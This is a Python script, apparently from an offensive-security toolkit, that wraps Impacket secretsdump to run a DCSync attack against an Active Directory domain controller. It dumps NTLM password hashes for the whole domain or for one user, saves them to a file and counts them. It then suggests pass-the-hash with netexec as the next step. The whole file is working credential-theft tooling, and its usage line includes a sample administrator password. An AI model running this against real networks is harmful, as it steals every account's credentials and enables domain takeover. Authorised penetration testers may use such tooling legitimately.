#!/usr/bin/env python3
"""Run DCSync through Impacket secretsdump and summarize dumped material.

Usage:
  python skills/persistence/scripts/dcsync.py -d corp.local -u administrator -p Passw0rd! --dc-ip 10.0.0.10 -o ./dcsync
"""

from __future__ import annotations

import argparse
import json
import re
import shutil
import subprocess
import sys
from pathlib import Path


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="DCSync wrapper with secretsdump.")
    parser.add_argument("-d", "--domain", required=True)
    parser.add_argument("-u", "--user", required=True)
    auth = parser.add_mutually_exclusive_group(required=True)
    auth.add_argument("-p", "--password")
    auth.add_argument("-H", "--hash", dest="nt_hash")
    parser.add_argument("--dc-ip", required=True)
    parser.add_argument(
        "--just-dc-user", help="Optional single user for just-dc-user mode"
    )
    parser.add_argument("-o", "--output", required=True, help="Output directory")
    return parser.parse_args()


def hash_count(text: str) -> int:
    return len(
        re.findall(
            r"^[^:]+:\d+:[0-9a-fA-F]{32}:[0-9a-fA-F]{32}:::", text, flags=re.MULTILINE
        )
    )


def main() -> int:
    args = parse_args()
    output_dir = Path(args.output).resolve()
    output_dir.mkdir(parents=True, exist_ok=True)
    output_path = output_dir / "dcsync_output.txt"

    tool = shutil.which("impacket-secretsdump") or shutil.which("secretsdump.py")
    target = f"{args.domain}/{args.user}@{args.dc_ip}"
    command = [tool or "impacket-secretsdump", target, "-just-dc", "-dc-ip", args.dc_ip]
    if args.password:
        command.extend(["-password", args.password])
    else:
        command.extend(["-hashes", args.nt_hash])
    if args.just_dc_user:
        command.extend(["-just-dc-user", args.just_dc_user])

    payload: dict[str, object] = {
        "tool": tool or "impacket-secretsdump",
        "tool_found": bool(tool),
        "command": command,
        "output_file": str(output_path),
        "hash_count_estimate": 0,
        "next_step": f"netexec smb {args.dc_ip} -u <user> -H <nthash>",
    }

    if not tool:
        print("[!] secretsdump not found. Printing command only.", file=sys.stderr)
        print(" ".join(command))
        print(json.dumps(payload, indent=2, ensure_ascii=False))
        return 0

    result = subprocess.run(command, capture_output=True, text=True, check=False)
    text = f"{result.stdout}\n{result.stderr}".strip() + "\n"
    output_path.write_text(text, encoding="utf-8")
    payload["return_code"] = result.returncode
    payload["hash_count_estimate"] = hash_count(text)
    print(json.dumps(payload, indent=2, ensure_ascii=False))
    return 0 if result.returncode == 0 else result.returncode


if __name__ == "__main__":
    raise SystemExit(main())
